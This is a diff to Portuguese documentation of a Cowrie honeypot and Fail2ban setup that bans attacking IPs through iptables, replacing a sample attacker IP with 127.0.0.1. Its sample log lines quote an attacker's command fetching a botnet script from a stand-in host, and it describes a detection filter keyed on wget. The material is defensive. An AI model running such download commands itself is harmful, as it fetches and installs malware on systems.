@@ -107,7 +107,7 @@ honeypot:
   "eventid": "cowrie.command.input",
   "input": "wget http://malicious.com/botnet.sh",
   "message": "CMD: wget http://malicious.com/botnet.sh",
-  "src_ip": "177.189.177.165",
+  "src_ip": "127.0.0.1",
   "timestamp": "2025-11-16T21:07:26.395058Z",
   "sensor": "3a78002ba118",
   "uuid": "db5d015e-c2d0-11f0-adce-3e0817dacbfc"
@@ -268,7 +268,7 @@ networks:
 
 ### 1. Atacante Conecta
 ```
-Atacante (IP: 177.189.177.165)
+Atacante (IP: 127.0.0.1)
     │
     │ SSH na porta 22
     ▼
@@ -295,7 +295,7 @@ Log gerado em cowrie.json:
 {
   "eventid": "cowrie.command.input",
   "input": "wget http://malicious.com/botnet.sh",
-  "src_ip": "177.189.177.165",
+  "src_ip": "127.0.0.1",
   ...
 }
 ```
@@ -308,7 +308,7 @@ Fail2ban monitora cowrie.json em tempo real
     ▼
 Aplica regex do filtro malware-commands
     │
-    │ Regex encontra: wget + IP 177.189.177.165
+    │ Regex encontra: wget + IP 127.0.0.1
     ▼
 Conta como 1 falha
     │
@@ -319,11 +319,11 @@ Executa ação: docker-user
 
 ### 4. IP é Banido
 ```
-Fail2ban executa: iptables -I DOCKER-USER 1 -s 177.189.177.165 -j DROP
+Fail2ban executa: iptables -I DOCKER-USER 1 -s 127.0.0.1 -j DROP
     │
     ▼
 Regra adicionada no iptables:
-DROP all -- 177.189.177.165 anywhere
+DROP all -- 127.0.0.1 anywhere
     │
     ▼
 Próxima tentativa de conexão do IP é bloqueada
@@ -337,7 +337,7 @@ Atacante não consegue mais conectar
 Após bantime (24h)
     │
     ▼
-Fail2ban executa: iptables -D DOCKER-USER -s 177.189.177.165 -j DROP
+Fail2ban executa: iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
     │
     ▼
 Regra removida do iptables
@@ -418,7 +418,7 @@ docker restart fail2ban_monitor
 
 ```bash
 # Desbanir um IP específico
-docker exec fail2ban_monitor fail2ban-client set malware-commands unbanip 177.189.177.165
+docker exec fail2ban_monitor fail2ban-client set malware-commands unbanip 127.0.0.1
 
 # Desbanir todos os IPs
 docker exec fail2ban_monitor fail2ban-client set malware-commands unbanall
@@ -437,7 +437,7 @@ sudo iptables -L DOCKER-USER -n -v
 sudo iptables -L DOCKER-USER -n -v | grep DROP
 
 # Remover regra manualmente (se necessário)
-sudo iptables -D DOCKER-USER -s 177.189.177.165 -j DROP
+sudo iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
 ```
 
 ### Logs e Monitoramento
